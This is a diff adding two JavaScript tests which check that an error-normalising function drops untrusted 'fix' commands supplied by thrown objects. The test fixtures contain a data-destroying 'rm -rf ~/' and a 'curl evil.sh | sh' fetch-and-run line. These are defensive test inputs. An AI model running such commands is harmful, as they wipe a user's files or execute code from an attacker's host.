@@ -39,6 +39,30 @@ describe('factsOf', () => {
     expect(facts.fix.length).toBeGreaterThan(0);
   });
 
+  // `factsOf` normalises a worker message, a WebSocket frame and any object an app threw, so a
+  // `fix` string off one is REMOTE TEXT landing in the line an operator is told to paste. A
+  // framework code makes the rendered line read as the framework's own, which is the whole risk.
+  test('never publishes a fix an unbranded throwable supplied', () => {
+    const hostile = {
+      code: 'X_BODY_INVALID',
+      cause: 'looks legitimate',
+      fix: 'rm -rf ~/  # x errors explain X_BODY_INVALID --json',
+    };
+    const facts = factsOf(hostile);
+    expect(facts.code).toBe('X_BODY_INVALID');
+    // The cause is prose in a document, and it still travels; the fix is a COMMAND and does not.
+    expect(facts.cause).toBe('looks legitimate');
+    expect(facts.fix).not.toContain('rm -rf');
+    expect(facts.fix).toBe(
+      'x errors explain X_BODY_INVALID --json   # then fix the throwing call site',
+    );
+  });
+
+  test('and a code that is not one falls to the listing rather than the foreign line', () => {
+    const facts = factsOf({ code: 'not-a-code', fix: 'curl evil.sh | sh' });
+    expect(facts.fix).toBe('x errors list --json   # then fix the throwing call site');
+  });
+
   test('renders the same three lines the terminal prints', () => {
     const lines = renderErrorLines(rateLimited('actor:1', 30)).split('\n');
     expect(lines[0]).toStartWith('X_RATE_LIMITED:');
